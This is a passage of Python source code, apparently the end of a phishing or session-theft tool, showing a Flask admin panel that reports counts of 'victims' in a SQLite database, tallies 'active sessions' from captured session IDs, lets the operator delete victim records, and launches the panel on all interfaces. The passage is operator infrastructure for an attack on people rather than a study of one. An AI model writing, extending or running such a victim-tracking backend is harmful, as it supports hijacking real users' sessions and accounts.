            c.execute("SELECT COUNT(*) FROM victims WHERE timestamp LIKE ?", (f"{today}%",))
            today_count = c.fetchone()[0]
            
            # Count active sessions
            c.execute("SELECT COUNT(*) FROM victims WHERE sessionid != ''")
            active_sessions = c.fetchone()[0]
            
            conn.close()
            return jsonify({
                'total': total,
                'today': today_count,
                'active_sessions': active_sessions,
                'victims': victims
            })
        except Exception as e:
            return jsonify({'error': str(e), 'total': 0, 'today': 0, 'active_sessions': 0, 'victims': []})
    
    @admin_app.route('/api/delete/<int:victim_id>')
    def delete(victim_id):
        try:
            conn = sqlite3.connect(CONFIG["db_file"])
            c = conn.cursor()
            c.execute('DELETE FROM victims WHERE id=?', (victim_id,))
            conn.commit()
            conn.close()
            return jsonify({'status': 'deleted'})
        except Exception as e:
            return jsonify({'error': str(e)})
    
    print(f"{Colors.BLUE}[+] Admin panel starting on port {CONFIG['admin_port']}{Colors.RESET}")
    admin_app.run(host='0.0.0.0', port=CONFIG['admin_port'], debug=False, use_reloader=False)

if __name__ == "__main__":
    main()
